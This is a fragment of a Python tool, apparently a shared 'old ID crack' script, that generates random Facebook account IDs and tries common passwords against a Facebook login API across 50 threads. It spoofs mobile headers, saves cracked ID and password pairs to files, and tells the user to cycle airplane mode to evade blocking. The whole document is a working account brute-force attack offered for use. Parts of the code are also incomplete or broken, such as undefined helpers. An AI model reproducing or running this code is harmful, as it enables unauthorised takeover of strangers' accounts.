  \033[1;92m═══════════════════════════════════════════════════
\033[1;35m •••••••••••••••• \x1b[0;41mDEVLOPED BY SHAJON\x1b[0;95m •••••••••••••••••
\033[1;32m • \033[1;32mFACEBOOK     \033[1;35m: \033[1;37mSHAJON ツ゚   \033[1;31m       •\033[1;35m              \033[1;31m •
\033[1;33m • \033[1;32mGITHUB       \033[1;35m: \033[38;5;51mSHAJON-404\033[1;32m         •\033[1;35m              \033[1;33m •
\033[1;34m • \033[1;32mTOOL TYPE    \033[1;35m: \033[1;32mOLD ID CRACK \033[1;35m(🔥)  •               •
\033[1;35m • \033[1;32mTOOL STATUS  \033[1;35m: \x1b[0;47m\033[1;35mPREMIUM\x1b[0;93m \033[1;33m           •\033[1;32m              \033[1;36m •
\033[1;36m • \033[1;32mVERSION      \033[1;35m: \033[1;32m[ \033[1;95m{version} \033[1;32m]  \033[1;34m(🤗)      •              \033[1;31m •
\033[1;35m •••••••••••••••• \033[1;32m                   \033[1;35m•••••••••••••••••\033[1;32m
  ═══════════════════════════════════════════════════'''
os.system('clear')
print(logo)
uname =input('\033[1;91m[\033[1;92m•\033[1;91m]\033[1;92m YOUR NAME \033[1;91m: \033[1;35m')
def clear():
    os.system("clear")
#_________[ LOGIN KEY ]______>>
"""
CorrectUsername = 'SHAJON-32' 
key = 'true'
while key == 'true':
    username = input('\033[1;91m[\033[1;92m•\033[1;91m] \033[1;92mENTER USERNAME \033[1;91m: \x1b[1;92m')
    if username == CorrectUsername:
            print('\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\033[0;97m[•]\033[1;32m LOGGED IN PAID TOOL SUCCESSFULLY') 
            time.sleep(1)
            clear()
            key = 'false'"""
#───────────────[ MAIN MENU ]───────────────#
def menu():
    user = []
    os.system('clear')
    print(logo)
    jalan(f"\033[1;31m[\033[1;37m≈\033[1;31m] \033[1;92mUSER NAME\033[1;91m :\033[1;96m " + uname)
    jalan('\033[10;93m  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    jalan(f'\033[1;31m[\033[1;37m1\033[1;31m] \033[1;37mCRACK (2011-2014) FACEBOOK ID ')
    jalan(f'\033[1;31m[\033[1;37m2\033[1;31m] \033[1;37mCRACK (2010-2011) FACEBOOK ID ')
    jalan(f'\033[1;31m[\033[1;37m3\033[1;31m] \033[1;37mCRACK (2008-2009) FACEBOOK ID ')
    jalan(f'\033[1;31m[\033[1;37m4\033[1;31m] \033[1;37mCRACK (2007-2009) FACEBOOK ID ')
    jalan(f'\033[1;31m[\033[1;37m5\033[1;31m] \033[1;37mCRACK (2006-2008) FACEBOOK ID ')
    jalan(f'\033[1;31m[\033[1;37m6\033[1;31m] \033[1;37mCRACK (2004-2006) FACEBOOK ID ')
    jalan('\033[10;93m  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    ask = input(f"\033[1;31m[\033[1;37m?\033[1;32m] INPUT : ")
    jalan(f'\r\033[1;91m  ═══════════════════════════════════════════════════')
    jalan(f'\033[1;31m[\033[1;37m☂\033[1;31m] \033[1;37mEXAMPLE LIMIT   \033[1;33m : \033[1;37m3000{R}/\033[1;37m5000{R}/\033[1;37m10000{R}/\033[1;37m99999')
    jalan(f'\r\033[1;91m  ═══════════════════════════════════════════════════')
    limit = input(f"\033[1;31m[\033[1;37m?\033[1;31m]\033[1;32m INPUT LIMIT \033[1;31m\033[1;32m: ")
    if ask == "1":
        star = "10000"
        for _ in range(int(limit)):
            data = str(random.choice(range(100000000, 999999999)))
            user.append(data)
    elif ask == "2":
        star = "100000"
        for _ in range(int(limit)):
            data = str(random.choice(range(10000000, 99999999)))
            user.append(data)
    elif ask == "3":
        star = "1"
        for _ in range(int(limit)):
            data = str(random.choice(range(100000000, 999999999)))
            user.append(data)
    elif ask == "4":
        star = "1"
        for _ in range(int(limit)):
            data = str(random.choice(range(10000000, 99999999)))
            user.append(data)
    elif ask == "5":
        star = "1"
        for _ in range(int(limit)):
            data = str(random.choice(range(1000000, 9999999)))
            user.append(data)
    else:
        star = ""
        for _ in range(int(limit)):
            data = str(random.choice(range(1000000, 9999999)))
            user.append(data)
    os.system('clear')
    print(logo)
    jalan(f'\033[1;31m[\033[1;37m1\033[1;31m]\033[1;37m METHOD \x1b[38;5;196m(\x1b[38;5;46mM1\x1b[38;5;196m)\x1b[38;5;196m[\x1b[38;5;46mAPI\x1b[38;5;196m]')
    jalan(f'\033[1;31m[\033[1;37m2\033[1;31m]\033[1;37m METHOD \x1b[38;5;196m(\x1b[38;5;46mM2\x1b[38;5;196m)\x1b[38;5;196m[\x1b[38;5;46mB API\x1b[38;5;196m]')
    print('\033[10;93m  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    lolx = input(f"\033[1;31m[\033[1;37m?\033[1;32m] INPUT : ")
    with ThreadPool(max_workers=50) as samira:
        os.system('clear')
        print(logo)
        jalan(f'\x1b[38;5;196m[\x1b[38;5;46m☂\x1b[38;5;196m]\x1b[38;5;46m TOTAL ID : {limit} \x1b[38;5;196m\x1b[38;5;196m<\x1b[38;5;46m━\x1b[38;5;196m> \x1b[38;5;46mCREDIT: SANJIDA AKTER (SAMIRA)')
        jalan(f'\x1b[38;5;196m[\x1b[38;5;46m☂\x1b[38;5;196m]\x1b[38;5;46m TURN \x1b[38;5;196m(\x1b[38;5;46mON\x1b[38;5;196m/\x1b[38;5;46mOFF\x1b[38;5;196m)\x1b[38;5;46m AIRPLANE MODE EVERY 3 MIN')
        print('\033[10;93m  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for mal in user:
            uid = star + mal
            if lolx in ["1", "01"]:
                samira.submit(login, uid)
            elif lolx in ["2", "02"]:
                samira.submit(loginx, uid)
            else:
                jalan("{RED}  Please Select Correct Option")
#───────────────[ OLD - CLONE - METHOD ]───────────────#
def login(uid):
    global oks,loop
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\x1b[38;5;196m[\x1b[38;5;48mFINDING\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\033[1;37m{loop}\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK•{len(oks)}\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mCP•{len(cps)}\x1b[38;5;196m]')
        sys.stdout.flush()
        maxx = random.choice(ugenfile)
        for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890","987654321"]:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": maxx, 
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            rp = Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
            if "session_key" in rp:
                print(f"\r{R}[{R}SHAJON-OK{R}]{R} {uid} | {pw}{YELLOW}"+sanjida(uid))
                open("/sdcard/SHAJON-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:          	
            	print(f"\r{R}[{pink}SHAJON-CP{R}]{pink} {uid} | {pw}{YELLOW}"+sanjida(uid))
            	open("/sdcard/SHAJON-OLD-CP.txt","a").write(uid+"|"+pw+"\n")
            	cps.append(uid)
            	break
            elif "Please Confirm Email" in str(rp):            
            	print(f"\r{R}[{G1}SHAJON-2F{R}]{G1} {uid} | {pw}{YELLOW}"+sanjida(uid))
            	open("/sdcard/SHAJON-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
            	cps.append(uid)
            	break
            else:continue
        loop+=1
    except:
        pass
#__________________| END |__________________#
try: 
    menu()
except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
except Exception as e:
    print(e)